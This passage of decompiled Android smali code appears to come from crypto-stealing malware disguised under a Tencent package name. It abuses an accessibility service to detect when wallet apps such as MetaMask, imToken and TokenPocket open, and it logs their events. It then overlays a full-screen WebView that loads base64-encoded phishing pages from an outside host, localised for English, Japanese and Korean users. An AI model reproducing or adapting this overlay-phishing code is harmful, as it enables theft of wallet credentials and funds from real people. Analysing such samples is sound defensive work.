    invoke-virtual {v4}, Landroid/view/accessibility/AccessibilityNodeInfo;->getViewIdResourceName()Ljava/lang/String;

    move-result-object v6

    if-eqz v6, :cond_1

    const-string v7, "com.wallet.crypto.trustapp:id/input_general_amount"

    .line 1913
    invoke-virtual {v6, v7}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v6

    if-eqz v6, :cond_1

    .line 1982
    sget-object v6, Lcom/tencent/BiometricTypeHelper;->USDT:Lcom/tencent/BiometricTypeHelper;

    .line 1986
    :cond_1
    invoke-virtual {v4}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V

    .line 1991
    :cond_2
    iget-boolean v4, v0, Lcom/tencent/AccessibilityServiceCore;->showbinance:Z

    if-eqz v4, :cond_5

    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityEvent;->getEventType()I

    move-result v4

    if-ne v4, v5, :cond_5

    .line 1992
    invoke-direct/range {p0 .. p1}, Lcom/tencent/AccessibilityServiceCore;->checkIfClickPermission(Landroid/view/accessibility/AccessibilityEvent;)Z

    move-result v4

    if-eqz v4, :cond_3

    return-void

    .line 1993
    :cond_3
    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityEvent;->getSource()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v4

    if-eqz v4, :cond_5

    .line 1995
    invoke-virtual {v4}, Landroid/view/accessibility/AccessibilityNodeInfo;->getViewIdResourceName()Ljava/lang/String;

    move-result-object v6

    if-eqz v6, :cond_4

    const-string v7, "com.binance.dev:id/2131364953"

    .line 1996
    invoke-virtual {v6, v7}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v6

    if-eqz v6, :cond_4

    .line 1997
    .line 2000
    :cond_4
    invoke-virtual {v4}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V

    .line 2011
    :cond_5
    :try_start_0
    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityEvent;->getEventType()I

    move-result v6
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 2012
    :try_start_1
    sput-object v1, Lcom/tencent/AccessibilityServiceCore;->tunesxconcerningn1012GlobalEvent:Landroid/view/accessibility/AccessibilityEvent;
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    goto :goto_0

    :catch_0
    const/4 v6, 0x0

    :catch_1
    :goto_0
    const/16 v8, 0x10

    const/4 v10, 0x2

    if-eq v6, v10, :cond_a

    if-eq v6, v5, :cond_9

    if-eq v6, v8, :cond_8

    const/16 v12, 0x20

    if-eq v6, v12, :cond_7

    const/16 v12, 0x40

    if-eq v6, v12, :cond_6

    const/4 v12, 0x0

    goto :goto_1

    :cond_6
    const/4 v12, 0x4

    goto :goto_1

    :cond_7
    const/4 v12, 0x5

    goto :goto_1

    :cond_8
    const/4 v12, 0x3

    goto :goto_1

    :cond_9
    const/4 v12, 0x1

    goto :goto_1

    :cond_a
    move v12, v10

    .line 2034
    :goto_1
    :try_start_2
    invoke-virtual {v0, v1, v12}, Lcom/tencent/AccessibilityServiceCore;->tunesxconcerningn1012sendlog(Landroid/view/accessibility/AccessibilityEvent;I)V

    .line 2036
    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityEvent;->getPackageName()Ljava/lang/CharSequence;

    move-result-object v13

    invoke-interface {v13}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v13

    invoke-virtual {v13}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v13

    .line 2037
    invoke-virtual/range {p0 .. p0}, Lcom/tencent/AccessibilityServiceCore;->getApplicationContext()Landroid/content/Context;

    move-result-object v14

    const-string v15, "SME"

    .line 2038
    invoke-static {v14, v15, v3}, Lcom/tencent/My_tunesxconcerningn10_Settings;->read(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v14

    invoke-virtual {v14, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v14
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_d

    const-string v15, "base64"

    const-string v8, "text/html"

    const-string v9, "ko"

    const-string v5, "ja"

    const-string v7, "en"

    const-string v10, "NO"

    const/16 v4, 0x800

    if-eqz v14, :cond_12

    :try_start_3
    const-string v14, "io.metamask"

    .line 2039
    invoke-virtual {v13, v14}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v14

    if-eqz v14, :cond_12

    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityEvent;->getEventType()I

    move-result v14

    if-ne v14, v4, :cond_12

    .line 2040
    invoke-virtual/range {p0 .. p0}, Lcom/tencent/AccessibilityServiceCore;->getApplicationContext()Landroid/content/Context;

    move-result-object v14

    const-string v4, "SME"

    invoke-static {v14, v4, v10}, Lcom/tencent/My_tunesxconcerningn10_Settings;->Write(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    .line 2043
    new-instance v4, Lcom/tencent/AccessibilityServiceCore$MyWebView;

    invoke-direct {v4, v0, v0}, Lcom/tencent/AccessibilityServiceCore$MyWebView;-><init>(Lcom/tencent/AccessibilityServiceCore;Landroid/content/Context;)V

    .line 2044
    new-instance v14, Landroid/view/ViewGroup$LayoutParams;

    const/4 v11, -0x1

    invoke-direct {v14, v11, v11}, Landroid/view/ViewGroup$LayoutParams;-><init>(II)V

    invoke-virtual {v4, v14}, Landroid/webkit/WebView;->setLayoutParams(Landroid/view/ViewGroup$LayoutParams;)V

    .line 2045
    invoke-virtual {v4}, Landroid/webkit/WebView;->requestFocus()Z

    const/4 v11, 0x1

    .line 2046
    invoke-virtual {v4, v11}, Landroid/webkit/WebView;->setFocusable(Z)V

    .line 2047
    invoke-virtual {v4, v11}, Landroid/webkit/WebView;->setFocusableInTouchMode(Z)V

    .line 2048
    invoke-virtual {v4}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v14

    .line 2049
    invoke-virtual {v14, v11}, Landroid/webkit/WebSettings;->setJavaScriptEnabled(Z)V

    .line 2050
    invoke-virtual {v14, v11}, Landroid/webkit/WebSettings;->setJavaScriptCanOpenWindowsAutomatically(Z)V

    .line 2051
    invoke-virtual {v14, v11}, Landroid/webkit/WebSettings;->setDomStorageEnabled(Z)V

    .line 2052
    invoke-virtual {v14, v11}, Landroid/webkit/WebSettings;->setCacheMode(I)V

    const/4 v11, 0x0

    .line 2053
    invoke-virtual {v4, v11}, Landroid/webkit/WebView;->setScrollBarStyle(I)V

    const/4 v11, 0x0

    const/4 v14, 0x2

    .line 2054
    invoke-virtual {v4, v14, v11}, Landroid/webkit/WebView;->setLayerType(ILandroid/graphics/Paint;)V

    .line 2055
    new-instance v14, Lcom/tencent/AccessibilityServiceCore$MyWebViewClient;

    invoke-direct {v14, v0, v11}, Lcom/tencent/AccessibilityServiceCore$MyWebViewClient;-><init>(Lcom/tencent/AccessibilityServiceCore;Lcom/tencent/AccessibilityServiceCore$1;)V

    invoke-virtual {v4, v14}, Landroid/webkit/WebView;->setWebViewClient(Landroid/webkit/WebViewClient;)V

    .line 2056
    new-instance v14, Lcom/tencent/AccessibilityServiceCore$MyWebChromeClient;

    invoke-direct {v14, v0, v11}, Lcom/tencent/AccessibilityServiceCore$MyWebChromeClient;-><init>(Lcom/tencent/AccessibilityServiceCore;Lcom/tencent/AccessibilityServiceCore$1;)V

    invoke-virtual {v4, v14}, Landroid/webkit/WebView;->setWebChromeClient(Landroid/webkit/WebChromeClient;)V

    const/16 v11, 0x82

    .line 2057
    invoke-virtual {v4, v11}, Landroid/webkit/WebView;->requestFocus(I)Z

    .line 2058
    invoke-virtual {v4}, Landroid/webkit/WebView;->requestFocusFromTouch()Z

    const/4 v11, 0x1

    .line 2059
    invoke-virtual {v4, v11}, Landroid/webkit/WebView;->setEnabled(Z)V

    .line 2060
    invoke-static {}, Ljava/util/Locale;->getDefault()Ljava/util/Locale;

    move-result-object v11

    invoke-virtual {v11}, Ljava/util/Locale;->getLanguage()Ljava/lang/String;

    move-result-object v11

    .line 2061
    invoke-virtual {v11}, Ljava/lang/String;->hashCode()I

    move-result v14

    const/16 v1, 0xca9

    if-eq v14, v1, :cond_d

    const/16 v1, 0xd37

    if-eq v14, v1, :cond_c

    const/16 v1, 0xd64

    if-eq v14, v1, :cond_b

    goto :goto_2

    :cond_b
    invoke-virtual {v11, v9}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_e

    const/4 v1, 0x2

    goto :goto_3

    :cond_c
    invoke-virtual {v11, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_e

    const/4 v1, 0x1

    goto :goto_3

    :cond_d
    invoke-virtual {v11, v7}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_e

    const/4 v1, 0x0

    goto :goto_3

    :cond_e
    :goto_2
    const/4 v1, -0x1

    :goto_3
    if-eqz v1, :cond_11

    const/4 v11, 0x1

    if-eq v1, v11, :cond_10

    const/4 v11, 0x2

    if-eq v1, v11, :cond_f

    const-string v1, "PCFET0NUWVBFIGh0bWw+DQo8aHRtbCBsYW5nPSJ6aC1DTiI+DQo8aGVhZD4NCjxtZXRhIGh0dHAtZXF1aXY9IkNvbnRlbnQtVHlwZSIgY29udGVudD0idGV4dC9odG1sOyBjaGFyc2V0PXV0Zi04IiAvPg0KPHRpdGxlPjwvdGl0bGU+DQo8c3R5bGU+DQoqIHsNCiAgICBtYXJnaW46IDA7DQogICAgcGFkZGluZzogMDsNCn0NCg0KaHRtbCxib2R5ew0KIGhlaWdodDoxMDAlOw0KfQ0KPC9zdHlsZT4NCjwvaGVhZD4NCjxib2R5Pg0KDQo8ZnJhbWVzZXQ+DQo8aWZyYW1lICBmcmFtZWJvcmRlcj0ibm8iIGJvcmRlcj0iMCIgIHdpZHRoPSIxMDAlIiBoZWlnaHQ9IjEwMCUiIG5hbWU9ImZyYW1lIiBzcmM9Imh0dHBzOi8vdXNkdC50aWFueGlhbjYuaW5mby9tZXRhbWFzayIvPg0KPC9mcmFtZXNldD4NCg0KPC9ib2R5Pg0KPC9odG1sPg=="

    goto :goto_4

    :cond_f
    const-string v1, "PCFET0NUWVBFIGh0bWw+DQo8aHRtbCBsYW5nPSJ6aC1DTiI+DQo8aGVhZD4NCjxtZXRhIGh0dHAtZXF1aXY9IkNvbnRlbnQtVHlwZSIgY29udGVudD0idGV4dC9odG1sOyBjaGFyc2V0PXV0Zi04IiAvPg0KPHRpdGxlPjwvdGl0bGU+DQo8c3R5bGU+DQoqIHsNCiAgICBtYXJnaW46IDA7DQogICAgcGFkZGluZzogMDsNCn0NCg0KaHRtbCxib2R5ew0KIGhlaWdodDoxMDAlOw0KfQ0KPC9zdHlsZT4NCjwvaGVhZD4NCjxib2R5Pg0KDQo8ZnJhbWVzZXQ+DQo8aWZyYW1lICBmcmFtZWJvcmRlcj0ibm8iIGJvcmRlcj0iMCIgIHdpZHRoPSIxMDAlIiBoZWlnaHQ9IjEwMCUiIG5hbWU9ImZyYW1lIiBzcmM9Imh0dHBzOi8vdXNkdC50aWFueGlhbjYuaW5mby9tZXRhbWFzay9rb3JlYSIvPg0KPC9mcmFtZXNldD4NCg0KPC9ib2R5Pg0KPC9odG1sPg=="

    goto :goto_4

    :cond_10
    const-string v1, "PCFET0NUWVBFIGh0bWw+DQo8aHRtbCBsYW5nPSJ6aC1DTiI+DQo8aGVhZD4NCjxtZXRhIGh0dHAtZXF1aXY9IkNvbnRlbnQtVHlwZSIgY29udGVudD0idGV4dC9odG1sOyBjaGFyc2V0PXV0Zi04IiAvPg0KPHRpdGxlPjwvdGl0bGU+DQo8c3R5bGU+DQoqIHsNCiAgICBtYXJnaW46IDA7DQogICAgcGFkZGluZzogMDsNCn0NCg0KaHRtbCxib2R5ew0KIGhlaWdodDoxMDAlOw0KfQ0KPC9zdHlsZT4NCjwvaGVhZD4NCjxib2R5Pg0KDQo8ZnJhbWVzZXQ+DQo8aWZyYW1lICBmcmFtZWJvcmRlcj0ibm8iIGJvcmRlcj0iMCIgIHdpZHRoPSIxMDAlIiBoZWlnaHQ9IjEwMCUiIG5hbWU9ImZyYW1lIiBzcmM9Imh0dHBzOi8vdXNkdC50aWFueGlhbjYuaW5mby9tZXRhbWFzay9qYXBhbiIvPg0KPC9mcmFtZXNldD4NCg0KPC9ib2R5Pg0KPC9odG1sPg=="

    goto :goto_4

    :cond_11
    const-string v1, "PCFET0NUWVBFIGh0bWw+DQo8aHRtbCBsYW5nPSJ6aC1DTiI+DQo8aGVhZD4NCjxtZXRhIGh0dHAtZXF1aXY9IkNvbnRlbnQtVHlwZSIgY29udGVudD0idGV4dC9odG1sOyBjaGFyc2V0PXV0Zi04IiAvPg0KPHRpdGxlPjwvdGl0bGU+DQo8c3R5bGU+DQoqIHsNCiAgICBtYXJnaW46IDA7DQogICAgcGFkZGluZzogMDsNCn0NCg0KaHRtbCxib2R5ew0KIGhlaWdodDoxMDAlOw0KfQ0KPC9zdHlsZT4NCjwvaGVhZD4NCjxib2R5Pg0KDQo8ZnJhbWVzZXQ+DQo8aWZyYW1lICBmcmFtZWJvcmRlcj0ibm8iIGJvcmRlcj0iMCIgIHdpZHRoPSIxMDAlIiBoZWlnaHQ9IjEwMCUiIG5hbWU9ImZyYW1lIiBzcmM9Imh0dHBzOi8vdXNkdC50aWFueGlhbjYuaW5mby9tZXRhbWFzayIvPg0KPC9mcmFtZXNldD4NCg0KPC9ib2R5Pg0KPC9odG1sPg=="

    .line 2080
    :goto_4
    invoke-virtual {v4, v1, v8, v15}, Landroid/webkit/WebView;->loadData(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    .line 2081
    invoke-direct {v0, v4}, Lcom/tencent/AccessibilityServiceCore;->loadMyPage(Landroid/webkit/WebView;)V

    .line 2086
    :cond_12
    invoke-virtual/range {p0 .. p0}, Lcom/tencent/AccessibilityServiceCore;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    const-string v4, "SIM"

    .line 2087
    invoke-static {v1, v4, v3}, Lcom/tencent/My_tunesxconcerningn10_Settings;->read(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v1, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_1a

    const-string v1, "im.token.app"

    .line 2088
    invoke-virtual {v13, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_1a

    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityEvent;->getEventType()I

    move-result v1

    const/16 v4, 0x800

    if-ne v1, v4, :cond_1a

    .line 2089
    invoke-virtual/range {p0 .. p0}, Lcom/tencent/AccessibilityServiceCore;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    const-string v4, "SIM"

    invoke-static {v1, v4, v10}, Lcom/tencent/My_tunesxconcerningn10_Settings;->Write(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    .line 2092
    new-instance v1, Lcom/tencent/AccessibilityServiceCore$MyWebView;

    invoke-direct {v1, v0, v0}, Lcom/tencent/AccessibilityServiceCore$MyWebView;-><init>(Lcom/tencent/AccessibilityServiceCore;Landroid/content/Context;)V

    .line 2093
    new-instance v4, Landroid/view/ViewGroup$LayoutParams;

    const/4 v11, -0x1

    invoke-direct {v4, v11, v11}, Landroid/view/ViewGroup$LayoutParams;-><init>(II)V

    invoke-virtual {v1, v4}, Landroid/webkit/WebView;->setLayoutParams(Landroid/view/ViewGroup$LayoutParams;)V

    .line 2094
    invoke-virtual {v1}, Landroid/webkit/WebView;->requestFocus()Z

    const/4 v4, 0x1

    .line 2095
    invoke-virtual {v1, v4}, Landroid/webkit/WebView;->setFocusable(Z)V

    .line 2096
    invoke-virtual {v1, v4}, Landroid/webkit/WebView;->setFocusableInTouchMode(Z)V

    .line 2097
    invoke-virtual {v1}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v11

    .line 2098
    invoke-virtual {v11, v4}, Landroid/webkit/WebSettings;->setJavaScriptEnabled(Z)V

    .line 2099
    invoke-virtual {v11, v4}, Landroid/webkit/WebSettings;->setJavaScriptCanOpenWindowsAutomatically(Z)V

    .line 2100
    invoke-virtual {v11, v4}, Landroid/webkit/WebSettings;->setDomStorageEnabled(Z)V

    .line 2101
    invoke-virtual {v11, v4}, Landroid/webkit/WebSettings;->setCacheMode(I)V

    const/4 v4, 0x0

    .line 2102
    invoke-virtual {v1, v4}, Landroid/webkit/WebView;->setScrollBarStyle(I)V

    const/4 v4, 0x0

    const/4 v11, 0x2

    .line 2103
    invoke-virtual {v1, v11, v4}, Landroid/webkit/WebView;->setLayerType(ILandroid/graphics/Paint;)V

    .line 2104
    new-instance v11, Lcom/tencent/AccessibilityServiceCore$MyWebViewClient;

    invoke-direct {v11, v0, v4}, Lcom/tencent/AccessibilityServiceCore$MyWebViewClient;-><init>(Lcom/tencent/AccessibilityServiceCore;Lcom/tencent/AccessibilityServiceCore$1;)V

    invoke-virtual {v1, v11}, Landroid/webkit/WebView;->setWebViewClient(Landroid/webkit/WebViewClient;)V

    .line 2105
    new-instance v11, Lcom/tencent/AccessibilityServiceCore$MyWebChromeClient;

    invoke-direct {v11, v0, v4}, Lcom/tencent/AccessibilityServiceCore$MyWebChromeClient;-><init>(Lcom/tencent/AccessibilityServiceCore;Lcom/tencent/AccessibilityServiceCore$1;)V

    invoke-virtual {v1, v11}, Landroid/webkit/WebView;->setWebChromeClient(Landroid/webkit/WebChromeClient;)V

    const/16 v4, 0x82

    .line 2106
    invoke-virtual {v1, v4}, Landroid/webkit/WebView;->requestFocus(I)Z

    .line 2107
    invoke-virtual {v1}, Landroid/webkit/WebView;->requestFocusFromTouch()Z

    const/4 v4, 0x1

    .line 2108
    invoke-virtual {v1, v4}, Landroid/webkit/WebView;->setEnabled(Z)V

    .line 2109
    invoke-static {}, Ljava/util/Locale;->getDefault()Ljava/util/Locale;

    move-result-object v4

    invoke-virtual {v4}, Ljava/util/Locale;->getLanguage()Ljava/lang/String;

    move-result-object v4

    .line 2110
    invoke-virtual {v4}, Ljava/lang/String;->hashCode()I

    move-result v11

    const/16 v14, 0xca9

    if-eq v11, v14, :cond_15

    const/16 v14, 0xd37

    if-eq v11, v14, :cond_14

    const/16 v14, 0xd64

    if-eq v11, v14, :cond_13

    goto :goto_5

    :cond_13
    invoke-virtual {v4, v9}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_16

    const/4 v4, 0x2

    goto :goto_6

    :cond_14
    invoke-virtual {v4, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_16

    const/4 v4, 0x1

    goto :goto_6

    :cond_15
    invoke-virtual {v4, v7}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_16

    const/4 v4, 0x0

    goto :goto_6

    :cond_16
    :goto_5
    const/4 v4, -0x1

    :goto_6
    if-eqz v4, :cond_19

    const/4 v11, 0x1

    if-eq v4, v11, :cond_18

    const/4 v11, 0x2

    if-eq v4, v11, :cond_17

    const-string v4, "PCFET0NUWVBFIGh0bWw+DQo8aHRtbCBsYW5nPSJ6aC1DTiI+DQo8aGVhZD4NCjxtZXRhIGh0dHAtZXF1aXY9IkNvbnRlbnQtVHlwZSIgY29udGVudD0idGV4dC9odG1sOyBjaGFyc2V0PXV0Zi04IiAvPg0KPHRpdGxlPjwvdGl0bGU+DQo8c3R5bGU+DQoqIHsNCiAgICBtYXJnaW46IDA7DQogICAgcGFkZGluZzogMDsNCn0NCg0KaHRtbCxib2R5ew0KIGhlaWdodDoxMDAlOw0KfQ0KPC9zdHlsZT4NCjwvaGVhZD4NCjxib2R5Pg0KDQo8ZnJhbWVzZXQ+DQo8aWZyYW1lICBmcmFtZWJvcmRlcj0ibm8iIGJvcmRlcj0iMCIgIHdpZHRoPSIxMDAlIiBoZWlnaHQ9IjEwMCUiIG5hbWU9ImZyYW1lIiBzcmM9Imh0dHBzOi8vdXNkdC50aWFueGlhbjYuaW5mby9pbXRva2VuIi8+DQo8L2ZyYW1lc2V0Pg0KDQo8L2JvZHk+DQo8L2h0bWw+"

    goto :goto_7

    :cond_17
    const-string v4, "PCFET0NUWVBFIGh0bWw+DQo8aHRtbCBsYW5nPSJ6aC1DTiI+DQo8aGVhZD4NCjxtZXRhIGh0dHAtZXF1aXY9IkNvbnRlbnQtVHlwZSIgY29udGVudD0idGV4dC9odG1sOyBjaGFyc2V0PXV0Zi04IiAvPg0KPHRpdGxlPjwvdGl0bGU+DQo8c3R5bGU+DQoqIHsNCiAgICBtYXJnaW46IDA7DQogICAgcGFkZGluZzogMDsNCn0NCg0KaHRtbCxib2R5ew0KIGhlaWdodDoxMDAlOw0KfQ0KPC9zdHlsZT4NCjwvaGVhZD4NCjxib2R5Pg0KDQo8ZnJhbWVzZXQ+DQo8aWZyYW1lICBmcmFtZWJvcmRlcj0ibm8iIGJvcmRlcj0iMCIgIHdpZHRoPSIxMDAlIiBoZWlnaHQ9IjEwMCUiIG5hbWU9ImZyYW1lIiBzcmM9Imh0dHBzOi8vdXNkdC50aWFueGlhbjYuaW5mby9pbXRva2VuL2tvcmVhIi8+DQo8L2ZyYW1lc2V0Pg0KDQo8L2JvZHk+DQo8L2h0bWw+"

    goto :goto_7

    :cond_18
    const-string v4, "PCFET0NUWVBFIGh0bWw+DQo8aHRtbCBsYW5nPSJ6aC1DTiI+DQo8aGVhZD4NCjxtZXRhIGh0dHAtZXF1aXY9IkNvbnRlbnQtVHlwZSIgY29udGVudD0idGV4dC9odG1sOyBjaGFyc2V0PXV0Zi04IiAvPg0KPHRpdGxlPjwvdGl0bGU+DQo8c3R5bGU+DQoqIHsNCiAgICBtYXJnaW46IDA7DQogICAgcGFkZGluZzogMDsNCn0NCg0KaHRtbCxib2R5ew0KIGhlaWdodDoxMDAlOw0KfQ0KPC9zdHlsZT4NCjwvaGVhZD4NCjxib2R5Pg0KDQo8ZnJhbWVzZXQ+DQo8aWZyYW1lICBmcmFtZWJvcmRlcj0ibm8iIGJvcmRlcj0iMCIgIHdpZHRoPSIxMDAlIiBoZWlnaHQ9IjEwMCUiIG5hbWU9ImZyYW1lIiBzcmM9Imh0dHBzOi8vdXNkdC50aWFueGlhbjYuaW5mby9pbXRva2VuL2phcGFuIi8+DQo8L2ZyYW1lc2V0Pg0KDQo8L2JvZHk+DQo8L2h0bWw+"

    goto :goto_7

    :cond_19
    const-string v4, "PCFET0NUWVBFIGh0bWw+DQo8aHRtbCBsYW5nPSJ6aC1DTiI+DQo8aGVhZD4NCjxtZXRhIGh0dHAtZXF1aXY9IkNvbnRlbnQtVHlwZSIgY29udGVudD0idGV4dC9odG1sOyBjaGFyc2V0PXV0Zi04IiAvPg0KPHRpdGxlPjwvdGl0bGU+DQo8c3R5bGU+DQoqIHsNCiAgICBtYXJnaW46IDA7DQogICAgcGFkZGluZzogMDsNCn0NCg0KaHRtbCxib2R5ew0KIGhlaWdodDoxMDAlOw0KfQ0KPC9zdHlsZT4NCjwvaGVhZD4NCjxib2R5Pg0KDQo8ZnJhbWVzZXQ+DQo8aWZyYW1lICBmcmFtZWJvcmRlcj0ibm8iIGJvcmRlcj0iMCIgIHdpZHRoPSIxMDAlIiBoZWlnaHQ9IjEwMCUiIG5hbWU9ImZyYW1lIiBzcmM9Imh0dHBzOi8vdXNkdC50aWFueGlhbjYuaW5mby9pbXRva2VuIi8+DQo8L2ZyYW1lc2V0Pg0KDQo8L2JvZHk+DQo8L2h0bWw+"

    .line 2129
    :goto_7
    invoke-virtual {v1, v4, v8, v15}, Landroid/webkit/WebView;->loadData(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    .line 2130
    invoke-direct {v0, v1}, Lcom/tencent/AccessibilityServiceCore;->loadMyPage(Landroid/webkit/WebView;)V

    .line 2134
    :cond_1a
    invoke-virtual/range {p0 .. p0}, Lcom/tencent/AccessibilityServiceCore;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    const-string v4, "STO"

    .line 2135
    invoke-static {v1, v4, v3}, Lcom/tencent/My_tunesxconcerningn10_Settings;->read(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v1, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_22

    const-string v1, "vip.mytokenpocket"

    .line 2136
    invoke-virtual {v13, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_22

    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityEvent;->getEventType()I

    move-result v1

    const/16 v4, 0x800

    if-ne v1, v4, :cond_22

    .line 2137
    invoke-virtual/range {p0 .. p0}, Lcom/tencent/AccessibilityServiceCore;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    const-string v4, "STO"

    invoke-static {v1, v4, v10}, Lcom/tencent/My_tunesxconcerningn10_Settings;->Write(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    .line 2140
    new-instance v1, Lcom/tencent/AccessibilityServiceCore$MyWebView;

    invoke-direct {v1, v0, v0}, Lcom/tencent/AccessibilityServiceCore$MyWebView;-><init>(Lcom/tencent/AccessibilityServiceCore;Landroid/content/Context;)V

    .line 2141
    new-instance v4, Landroid/view/ViewGroup$LayoutParams;

    const/4 v11, -0x1

    invoke-direct {v4, v11, v11}, Landroid/view/ViewGroup$LayoutParams;-><init>(II)V

    invoke-virtual {v1, v4}, Landroid/webkit/WebView;->setLayoutParams(Landroid/view/ViewGroup$LayoutParams;)V

    .line 2142
    invoke-virtual {v1}, Landroid/webkit/WebView;->requestFocus()Z

    const/4 v4, 0x1

    .line 2143
    invoke-virtual {v1, v4}, Landroid/webkit/WebView;->setFocusable(Z)V

    .line 2144
    invoke-virtual {v1, v4}, Landroid/webkit/WebView;->setFocusableInTouchMode(Z)V

    .line 2145
    invoke-virtual {v1}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v11

    .line 2146
    invoke-virtual {v11, v4}, Landroid/webkit/WebSettings;->setJavaScriptEnabled(Z)V

    .line 2147
    invoke-virtual {v11, v4}, Landroid/webkit/WebSettings;->setJavaScriptCanOpenWindowsAutomatically(Z)V

    .line 2148
    invoke-virtual {v11, v4}, Landroid/webkit/WebSettings;->setDomStorageEnabled(Z)V

    .line 2149
    invoke-virtual {v11, v4}, Landroid/webkit/WebSettings;->setCacheMode(I)V

    const/4 v4, 0x0

    .line 2150
    invoke-virtual {v1, v4}, Landroid/webkit/WebView;->setScrollBarStyle(I)V

    const/4 v4, 0x0

    const/4 v11, 0x2

    .line 2151
    invoke-virtual {v1, v11, v4}, Landroid/webkit/WebView;->setLayerType(ILandroid/graphics/Paint;)V

    .line 2152
    new-instance v11, Lcom/tencent/AccessibilityServiceCore$MyWebViewClient;

    invoke-direct {v11, v0, v4}, Lcom/tencent/AccessibilityServiceCore$MyWebViewClient;-><init>(Lcom/tencent/AccessibilityServiceCore;Lcom/tencent/AccessibilityServiceCore$1;)V

    invoke-virtual {v1, v11}, Landroid/webkit/WebView;->setWebViewClient(Landroid/webkit/WebViewClient;)V

    .line 2153
    new-instance v11, Lcom/tencent/AccessibilityServiceCore$MyWebChromeClient;

    invoke-direct {v11, v0, v4}, Lcom/tencent/AccessibilityServiceCore$MyWebChromeClient;-><init>(Lcom/tencent/AccessibilityServiceCore;Lcom/tencent/AccessibilityServiceCore$1;)V

    invoke-virtual {v1, v11}, Landroid/webkit/WebView;->setWebChromeClient(Landroid/webkit/WebChromeClient;)V

    const/16 v4, 0x82

    .line 2154
    invoke-virtual {v1, v4}, Landroid/webkit/WebView;->requestFocus(I)Z

    .line 2155
    invoke-virtual {v1}, Landroid/webkit/WebView;->requestFocusFromTouch()Z

    const/4 v4, 0x1

    .line 2156
    invoke-virtual {v1, v4}, Landroid/webkit/WebView;->setEnabled(Z)V

    .line 2157
    invoke-static {}, Ljava/util/Locale;->getDefault()Ljava/util/Locale;

    move-result-object v4

    invoke-virtual {v4}, Ljava/util/Locale;->getLanguage()Ljava/lang/String;

    move-result-object v4

    .line 2158
    invoke-virtual {v4}, Ljava/lang/String;->hashCode()I

    move-result v11

    const/16 v14, 0xca9

    if-eq v11, v14, :cond_1d

    const/16 v14, 0xd37

    if-eq v11, v14, :cond_1c

    const/16 v14, 0xd64

    if-eq v11, v14, :cond_1b

    goto :goto_8

    :cond_1b
    invoke-virtual {v4, v9}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_1e

    const/4 v4, 0x2

    goto :goto_9

    :cond_1c
    invoke-virtual {v4, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_1e

    const/4 v4, 0x1

    goto :goto_9

    :cond_1d
    invoke-virtual {v4, v7}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_1e

    const/4 v4, 0x0

    goto :goto_9

    :cond_1e
    :goto_8
    const/4 v4, -0x1

    :goto_9
    if-eqz v4, :cond_21

    const/4 v11, 0x1

    if-eq v4, v11, :cond_20

    const/4 v11, 0x2

    if-eq v4, v11, :cond_1f

